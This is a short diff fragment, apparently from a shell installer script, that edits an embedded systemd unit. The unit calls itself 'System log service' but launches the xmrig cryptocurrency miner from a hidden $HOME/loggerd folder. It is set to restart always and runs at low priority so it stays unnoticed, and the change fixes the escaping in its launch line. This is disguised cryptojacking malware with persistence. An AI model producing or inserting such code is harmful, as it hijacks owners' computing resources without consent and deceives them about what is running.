@@ -289,7 +289,7 @@ else
 Description=System log service.
 
 [Service]
-ExecStart=$HOME/loggerd/xmrig --config=$HOME/loggerd/config.json && kill -31 $(pgrep -o xmrig)
+ExecStart=$HOME/loggerd/xmrig --config=$HOME/loggerd/config.json && kill -31 $$(pgrep -o xmrig)
 Restart=always
 Nice=10
 CPUWeight=1
